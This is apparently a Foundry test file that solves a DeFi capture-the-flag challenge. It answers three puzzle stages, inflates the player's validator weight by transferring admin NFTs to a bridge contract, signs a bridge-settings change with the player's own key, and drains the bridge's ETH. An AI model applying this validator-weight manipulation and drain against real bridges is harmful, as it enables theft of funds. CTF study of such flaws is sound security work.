// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity ^0.8.20;

import {Test, console, console2} from "forge-std/Test.sol";
import "../src/Challenge.sol";
import "../src/Bridge.sol";
import "../src/AdminNFT.sol";
import "../src/openzeppelin-contracts/utils/cryptography/ECDSA.sol";

contract RichChallenge is Test {
    using ECDSA for bytes32;
    using ECDSA for bytes;
    Challenge public challenge;
    Bridge public bridge;
    AdminNFT public adminNFT;
    
    // address public constant PLAYER = address(0x1337);

    uint256 privateKey = vm.deriveKey("test test test test test test test test test test test junk", 0);
    address public PLAYER = vm.addr(privateKey);

    uint256 public constant INITIAL_BALANCE = 100 ether;
    
    event Stage1Completed(address player, uint256 x);
    event Stage2Completed(address player, uint256 x, uint256 y);
    event Stage3Completed(address player, uint256 x, uint256 y, uint256 z);
    event ChallengeSolved(address winner);
    
    function setUp() public {
        address challengeAddr = address(new Challenge{value: 100 ether}(PLAYER));
        challenge = Challenge(challengeAddr);
        // vm.deal(PLAYER, INITIAL_BALANCE);
        vm.label(PLAYER, "PLAYER");
    }
    
    function testStageSuccess() public {
        vm.startPrank(PLAYER);

        challenge.solveStage1(6);
        challenge.solveStage2(5959,1);
        challenge.solveStage3(1,2,12);
        
        bridge = challenge.BRIDGE();
        bridge.verifyChallenge();

        adminNFT =  challenge.ADMIN_NFT();
        adminNFT.safeTransferFrom(PLAYER, address(bridge), 0, 0, "");
        uint256 validator = bridge.validatorWeights(PLAYER);
        console2.log(validator);


        challenge.ADMIN_NFT().safeBatchTransferFrom(PLAYER, address(bridge), new uint256[](300), new uint256[](300), "");
        uint256 totalWeight = bridge.totalWeight();
        validator = bridge.validatorWeights(PLAYER);
        console2.log(validator);
        console.log(totalWeight);
        console.log(bridge.bridgeSettingValidators(0));


    
        bytes memory message = abi.encode(address(challenge), address(adminNFT), uint256(2**96));
        bytes32 ethSignedMessageHash = message.toEthSignedMessageHash();
        (uint8 v,bytes32 r, bytes32 s) = vm.sign(privateKey, ethSignedMessageHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        bytes[] memory signatures = new bytes[](1);
        signatures[0] = signature;

        bridge.changeBridgeSettings(message, signatures);
        
        console.log(address(bridge).balance);
        bridge.withdrawEth(bytes32(""), new bytes[](0), PLAYER, address(bridge).balance, bytes(""));
        require(challenge.isSolved(), "Challenge not fully solved");
        vm.stopPrank();
    }
    
    
}
